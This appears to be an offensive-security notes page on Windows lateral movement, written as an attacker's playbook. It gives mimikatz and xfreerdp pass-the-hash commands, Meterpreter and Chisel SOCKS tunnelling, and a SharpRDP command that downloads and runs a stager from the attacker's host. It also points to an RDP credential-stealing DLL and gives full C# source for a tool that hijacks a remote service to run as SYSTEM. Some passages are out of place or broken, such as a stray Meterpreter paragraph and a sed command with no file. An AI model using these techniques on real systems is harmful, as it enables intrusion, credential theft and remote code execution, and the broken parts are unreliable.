---
title: Windows lateral movement
tags:
  - windows
  - lateral
  - movement
  - breach
  - operations
  - rdp
  - proxy
  - metasploit
  - sharprdp
  - mimikatz
  - hashing
  - pass
  - hash
  - socks
  - chisel
  - psexec
  - proxychains
---

## Remote desktop protocol

**Remote desktop protocol (RDP)** is a Windows application that allows users to
create interactive sessions between Terminal Servers. Regular authentication via
RDP caches the user's credentials on the host, as a user's credentials are
required to authenticate to the remote server. Using the techniques we described
[[windows-credentials|in our Mimikatz discussion]], we can dump a user's
password hashes for cracking later.

Using the terminal service, `mstsc.exe`, we can also authenticate to and
establish sessions with remote hosts without providing credentials, using cached
credentials of the logged-in user. We can do this by providing the
`/restrictedadmin` parameter during the invocation of the `mstsc.exe` program.
This technique is called **passing the hash**.

### Passing the hash

In a scenario where we're in the possession of a password hash for the `admin`
user of a domain and we're logged into a terminal within the domain as a
different user, for example `dave`, because we have connectivity to the domain
controller within the domain, we can attempt to pass the hash using the `admin`
user's NTLM hash to acquire a session on the target host. Here's a demonstration
of this using **mimikatz**:

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:${USER} /domain:${DOMAIN} /ntlm:${HASH} /run:"mstsc.exe /restrictedadmin"
```

Restricted admin mode is not enabled by default, however, we can use the pass
the hash technique to execute commands on the target host to re-enable
restricted admin mode by targeting the
`HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` registry
key. Invoking the following `mimikatz` command will provide us with a
**PowerShell** session as a target user by passing the hash:

```cmd
mimikatz # sekurlsa::pth /user:${USER} /domain:${DOMAIN} /ntlm:${HASH} /run:powershell
```

Once the Meterpreter session is active, we'll send it to the background and
switch to the `multi/manage/autoroute` module. This will allow us to configure a
reverse tunnel through the Meterpreter session and use that with a **SOCKS**
proxy. Invoking the following PowerShell, we can impersonate the target user and
enable restricted admin mode:

```powershell
Enter-PSSession -Computer "${COMPUTERNAME}"
New-ItemProperty `
	-Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
	-Name DisableRestrictedAdmin `
	-Value 0
```

We can also pass NTLM hashes with **xfreerdp** by invoking the following:

```bash
xfreerdp /u:${USER} /pth:${HASH} /v:${RHOST}
```

### Metasploit

We'll frequently encounter scenarios where our compromised targets are protected
within a virtual network with a NAT gateway, firewall, etc. preventing us from
creating inbound connections to our target. This is why reverse shells are so
useful, because the compromised host can call back to our C2 to establish a
connection, bypassing any firewalls and enabling our connection to the remote
target.

Once we land a **meterpreter** agent on a target host, we can use that agent to
proxy our RDP session by establishing a reverse tunnel and a **SOCKS** proxy. We
invoke the following in **msfconsole** with an active agent session to establish
a proxy:

```bash
use multi/manage/autoroute
set session ${SESSION}
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j
```

The above invocation establishes a reverse tunnel through the current session,
creating routing rules on our attacker host to route traffic destined for our
target's private network through the tunnel we created. We then establish a
SOCKS proxy on the host listening on `127.0.0.1:1080` and run it in the
background.

Now we can use the **proxychains** application to proxy our RDP communications
to the target through the SOCKS proxy with the example invocation:

```bash
sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
proxychains rdesktop ${RHOST}
```

We can use `proxychains` for more than just RDP, we can use applications like
**nmap**, for host discovery within the target's private network, or **firefox**
to browse web applications on servers only routeable within the target network.

### Chisel

[Chisel](https://github.com/jpillora/chisel) is a pretty neat application that
can also create reverse tunnels and proxy our communications. We can invoke the
following with `chisel` to setup a SOCKS proxy on our attacker host:

```bash
chisel server -p 8080 --socks5
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' # enable SSH password login on this host
sudo systemctl start ssh.service
ssh -N -D 0.0.0.0:1080 localhost
```

On the target, we can execute the following to initiate a reverse tunnel with
`chisel`:

```powershell
chisel.exe client ${LHOST} socks
```

Once the reverse connection is established, we can use the SOCKS proxy to
establish an RDP session with our target:

```bash
sudo proxychains rdesktop ${RHOST}
```

### SharpRDP

[SharpRDP](https://github.com/0xthirteen/SharpRDP) uses the terminal services
library, `mstscax.dll`, to interact with non-scriptable interfaces for
authentication used in the same way by `mstsc.exe`. We can use **SharpRDP** to
execute code through the `SendKeys` terminal services interface, requiring no
GUI access and rendering the creation of reverse tunnels unnecessary. Here's an
example execution of `SharpRDP.exe` to invoke an application on a target host
after authentication:

```powershell
Start-Process `
	-FilePath ".\SharpRDP.exe" `
	-ArgumentList @(
		"computername=${COMPUTERNAME}",
		"command=${COMMAND}",
		"username=${DOMAIN}\${USER}",
		"password=${PASSWORD}"
	)
```

Here's an example invocation to execute the download of a PowerShell stager on a
target host:

```powershell
$COMMAND="powershell -Command `"(Invoke-RestMethod -Uri http://${LHOST}:${LPORT}/stager.ps1 -UseBasicParsing) | Invoke-Expression`""

Start-Process `
	-FilePath ".\SharpRDP.exe" `
	-ArgumentList @(
		"computername=${COMPUTERNAME}",
		"command=${COMMAND}",
		"username=${DOMAIN}\${USER}",
		"password=${PASSWORD}"
	)
```

### Stealing RDP credentials

When users provide their credentials to establish RDP sessions, they're passed
in plaintext to the program. If we could inject into the `mstsc.exe` and hook
the correct methods, we could dump the user's credentials when they attempt to
RDP - essentially a keylogger. [RdpThief](https://github.com/0x09AL/RdpThief) is
a standalone DLL that we can inject to conduct this attack. Tools like
[RDPThiefInject](https://github.com/S3cur3Th1sSh1t/RDPThiefInject) provide
example code to generate payloads.

## PsExec

The **SysInternals** **PsExec** application enables lateral movement by using
the current user's authentication context to pass the hash to a target computer,
create a new service on the remote host, and start the service in the context of
**SYSTEM**. This requires the PsExec application to drop a binary on the remote
host as an executable file is required to correctly configure a new service.

We can avoid creating a new service and dropping a file on the remote host by
hijacking a currently existing service and modifying its configured executable.
Using the follow C# .NET code, we can implement this tactic:

```csharp
﻿using System.Runtime.InteropServices;

namespace QuietPsExec;

class Program
{
    [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
    [return:MarshalAs(UnmanagedType.Bool)]
    public static extern bool ChangeServiceConfigA(
        IntPtr hService,
        uint dwServiceType,
        int dwStartType,
        int dwErrorControl,
        string lpBinaryPathName,
        string? lpLoadOrderGroup,
        string? lpdwTagId,
        string? lpDependencies,
        string? lpServiceStartName,
        string? lpPassword,
        string? lpDisplayName
    );

    [DllImport(
        "advapi32.dll",
        EntryPoint = "OpenSCManagerW",
        ExactSpelling = true,
        CharSet = CharSet.Unicode,
        SetLastError = true
    )]
    public static extern IntPtr OpenSCManager(
        string machineName,
        string? databaseName,
        uint dwAccess
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr OpenService(
        IntPtr hSCManager,
        string lpServiceName,
        uint dwDesiredAccess
    );

    [DllImport("advapi32", SetLastError = true)]
    [return:MarshalAs(UnmanagedType.Bool)]
    public static extern bool StartService(
        IntPtr hService,
        int dwNumServiceArgs,
        string[]? lpServiceArgVectors
    );

    private const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
    private const uint SERVICE_ALL_ACCESS = 0xF01FF;

    static void Main(string[] args)
    {
        string targetComputer = args[0];
        string serviceName = args[1];
        string programName = args[2];

        IntPtr hSCManager = OpenSCManager(
            targetComputer,
            null,
            SC_MANAGER_ALL_ACCESS
        );

        IntPtr hService = OpenService(
            hSCManager,
            serviceName,
            SERVICE_ALL_ACCESS
        );

        ChangeServiceConfigA(
            hService,
            0xffffffff,
            3,
            0,
            programName,
            null,
            null,
            null,
            null,
            null,
            null
        );

        StartService(hService, 0, null);
    }
}
```

An example invocation of this compiled program will modify the **SensorService**
service to execute the **notepad** application as the SYSTEM user:

```powershell
Start-Process `
	-FilePath ".\QuietPsExec.exe" `
	-ArgumentList @(
		"${COMPUTERNAME}",
		"SensorService",
		"notepad.exe"
	)
```

While the above code is intended to be executed from a compromised host within
our target domain, we can also exfiltrate NTLM hashes for target users and
execute the same technique from our attacker machine. This tactic is implemented
in the [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) application.
